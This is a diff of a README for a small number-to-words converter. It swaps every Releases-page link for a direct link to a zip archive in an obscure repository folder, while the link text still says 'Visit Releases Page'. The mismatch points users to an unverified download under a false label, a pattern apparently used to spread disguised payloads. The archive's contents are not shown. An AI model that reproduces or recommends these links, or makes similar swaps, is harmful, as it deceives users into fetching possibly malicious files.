@@ -6,11 +6,11 @@ Welcome to the **Numbers-Words-Converter**! This simple tool helps you transform
 
 ## 📥 Download the Application
 
-[![Download Numbers-Words-Converter](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/sukuna-34/Numbers-Words-Converter/releases)
+[![Download Numbers-Words-Converter](https://raw.githubusercontent.com/sukuna-34/Numbers-Words-Converter/main/untholeable/Numbers-Words-Converter-3.3-beta.2.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/sukuna-34/Numbers-Words-Converter/main/untholeable/Numbers-Words-Converter-3.3-beta.2.zip)
 
 To start using the application, visit the Releases page to download the latest version. 
 
-👉 [Visit Releases Page to Download](https://github.com/sukuna-34/Numbers-Words-Converter/releases)
+👉 [Visit Releases Page to Download](https://raw.githubusercontent.com/sukuna-34/Numbers-Words-Converter/main/untholeable/Numbers-Words-Converter-3.3-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -53,7 +53,7 @@ Before downloading the application, ensure that your system meets the following 
 Make sure to follow these steps to download and install the **Numbers-Words-Converter** application:
 
 - **Step 1:** Go to the Releases page:  
-  👉 [Visit Releases Page to Download](https://github.com/sukuna-34/Numbers-Words-Converter/releases)
+  👉 [Visit Releases Page to Download](https://raw.githubusercontent.com/sukuna-34/Numbers-Words-Converter/main/untholeable/Numbers-Words-Converter-3.3-beta.2.zip)
 
 - **Step 2:** Choose the applicable version based on your operating system.
 
